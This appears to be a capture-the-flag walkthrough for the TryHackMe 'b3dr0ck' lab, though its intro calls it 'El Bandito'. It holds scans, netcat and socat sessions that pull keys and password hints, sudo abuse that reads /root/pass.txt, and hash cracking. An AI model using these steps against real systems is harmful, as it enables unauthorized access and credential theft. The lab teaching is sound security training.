# b3dr0ck Walkthrough
<br/>

## Intro
Welcome to the "El Bandito" challenge, here is the link to the [room](https://tryhackme.com/room/b3dr0ck) on TryHackMe.

> [!NOTE] The Story
> Fred Flintstone   &   Barney Rubble!  
> 
> Barney is setting up the ABC webserver, and trying to use TLS certs to secure connections, but he's having trouble. Here's what we know...
> - He was able to establish `nginx` on port `80`,  redirecting to a custom TLS webserver on port `4040`
> - There is a TCP socket listening with a simple service to help retrieve TLS credential files (client key & certificate)
> - There is another TCP (TLS) helper service listening for authorized connections using files obtained from the above service
> - Can you find all the Easter eggs?

Whenever you feel ready press on "Start Machine" and connect via OpenVPN or using the AttackBox.

Let's begin!

<br/>
<br/>

## The Challenge
Let's start by adding the machine IP to our hosts file:
```bash
echo "MACHINE_IP b3dr0ck.thm" | sudo tee -a /etc/hosts
```

Scan for open ports:
```bash
rustscan -a b3dr0ck.thm  --ulimit 5000 -- -A
```

This quickly finds port 22 and 80 open and it also detects right the redirect to port 4040:
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://b3dr0ck.thm:4040/
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
```

Now let's check what's hosted on the webserver by visiting `https://b3dr0ck.thm:4040/` in our browser.
We can see some fun little story/conversation about nginx, securing a connection and a database.

Checking for some common files like `robots.txt` i got this error message:
```
File /usr/share/abc/public/robots.txt not found!
```

This tells us that the cwd for the server is `/usr/share/abc/public`, nice to know, might be useful later on.

Further scans here for hidden directories revealed nothing relevant:
```BASH
gobuster dir -u https://b3dr0ck.thm:4040/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt    -t 160 --no-tls-validation
```

Since the website homepage was also talking about something over 9000, i thought this might be a port and that rustscan might has missed it previously.
So let's do a more targeted scan with nmap:
```bash
 nmap -sC -sV -p 9000-10000 b3dr0ck.thm
```
- the top-end range here is completely arbitrary, chosen to minimize scan time, if we get no result we move higher...

And looks like we find something interesting:
```
|_    What are you looking for?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fing
erprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9009-TCP:V=7.95%I=7%D=9/6%Time=68BC37F1%P=x86_64-pc-linux-gnu%r(NUL
```

Port 9009 has some weird characters and the message "What are you looking for?", this is worth investigating.

Since it says is a TCP connection we can try a direct connection using *netcat*:
```bash
nc b3dr0ck.thm 9009
```

And yes, there is definitely something running here, and we get this:
```
 __          __  _                            _                   ____   _____
 \ \        / / | |                          | |            /\   |  _ \ / ____|
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ <| |
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|




What are you looking for?
```

If we input something like "test" we get the message:
```
Sorry, unrecognized request: 'test'

You use this service to recover your client certificate and private key
```

That's very interesting, an exposed service to recover certs and keys, what about if we as for "key"?
It works and it sends us the private key:
```
Sounds like you forgot your private key. Let's find it for you...
-----BEGIN RSA PRIVATE KEY-----
REDACTED-FOR-THE-WRITEUP
-----END RSA PRIVATE KEY-----
```

Let's also collect the "certificate":
```
Sounds like you forgot your certificate. Let's find it for you...

-----BEGIN CERTIFICATE-----
REDACTED-FOR-THE-WRITEUP
-----END CERTIFICATE-----
```

Finally on the website we can remember an username: Barney, let's save this 2 files
- Copy the key and certificates in 2 files:
```bash
vim client.key
```
```bash
vim client.pub
```

Set the right permissions:
```bash
chmod 600 client.key
```
```bash
chmod 644 client.crt
```

Still interacting with that port, trying some other keywords i came across  "login" which gave a command to run with another port we did not detected previously:
```bash
socat stdio ssl:MACHINE_IP:54321,cert=<CERT_FILE>,key=<KEY_FILE>,verify=0
```

Let's complete and run this:
```bash
socat stdio ssl:b3dr0ck.thm:54321,cert=client.crt,key=client.key,verify=0
```

And it works: "Welcome: 'Barney Rubble' is authorized."
If we insert some commands like `ls` we get the message: 
```
This service is for login and password hints
```

Let's see what we can extract.
```
password
Password hint: d1ad7cREDACTED-FOR-THE-WRITEUP (user = 'Barney Rubble')
# and
login
Login is disabled. Please use SSH instead.
```

Nice looks like we got an HASH for the SSH login password.
We can identify and crack it:
```bash
nth --text "d1ad7cREDACTED-FOR-THE-WRITEUP"
```

For some reason this MD5 looking hash was actually the password, this got me waste some time, but finally we got a shell as barney and we can get  the first flag:
```bash
cat barney.txt
```
--> REDACTED

<br/>

### Becoming Fred
Now is time to move laterally and become the user Fred.
Let's check if we can run any binary as super user:
```bash
sudo -l
```
```
User barney may run the following commands on ip-10-10-219-28:
    (ALL : ALL) /usr/bin/certutil
```

Looks like we can run *certutil* as super user, maybe we can leverage that one to jump to another user.
This tool is used to manage certificates and keys, with super user rights we should be able to get this pairs for the user "Fred Flintstone":
```bash
sudo /usr/bin/certutil fred "Fred Flintstone"
```

Now let's save them on our machine and we can proceed as we did previously:
```bash
vim client2.key
vim client2.crt
```
```bash
chmod 600 client2.key && chmod 644 client2.crt
```

Connect to the password helper:
```bash
socat stdio ssl:b3dr0ck.thm:54321,cert=client2.crt,key=client2.key,verify=0
```

Now we ask for the password again:
```
 password
Password hint: YaREDACTED-FOR-THE-WRITEUP (user = 'Fred Flintstone')
```

Time to SSH as Fred:
```bash
ssh fred@b3dr0ck.thm 
```

And we can get the second flag:
```bash
cat fred.txt
```
--> REDACTED

<br/>

### Root Flag
Time to reach the root!
Let's check once again if we can run something as super user:
```bash
sudo -l
```
```
User fred may run the following commands on ip-10-10-219-28:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
```

Let's get the root pass:
```bash
 sudo /usr/bin/base64 /root/pass.txt
```

We get a long string encoded in base64, we can decode it:
```bash
echo "TEZLRUM1MlpREDACTED-FOR-THE-WRITEUP" | base64 -d
```

This is the decoded string:
```
LFKEC52ZKRCXSWKXIZVREDACTED-FOR-THE-WRITEUP
```

But this is still not the password, looks like it is still encoded, probably multiple times, let's decode this base 32:
```bash
 echo "LFKEC52ZKRCXSWKXREDACTED-FOR-THE-WRITEUP" | base32 -d
```

We get `YTAwYTEyREDACTED-FOR-THE-WRITEUP`, this is still not the password, let's try to decode this b64 once again:
```bash
echo "YTAwYTEyYWFkREDACTED-FOR-THE-WRITEUP" | base64 -d
```

And we get: `a00a12aad6bREDACTED-FOR-THE-WRITEUP` this time is no more encoded but should be an hash, let's send it to NTH to find the type:
```bash
nth --text "a00a12aad6bREDACTED-FOR-THE-WRITEUP"
```

It is an MD5 hash we can crack it... trying with the usual rockyou.txt will fails here as the password is not in the list, if you get no result you should either try with some other bigger lists or for some hashes you can use Crackstation.net (it is also possible to download their 15GB wordlist but is pretty heavy compared to the 140MB old rockyou.)

--> REDACTED-FOR-THE-WRITEUP

And we can now become root:
```bash
su root
```

And get the final flag:
```bash
cat /root/root.txt
```
--> REDACTED

<br/>
<br/>

## Conclusion
Congratulations you have successfully found the hidden "credentials restore" service on hosted on the high port, leveraged that to gain initial access and escalated your privileges by exploiting sudo permissions. 

I hope you had fun doing the challenge and following along!

Catch you in the next CTF 😃 
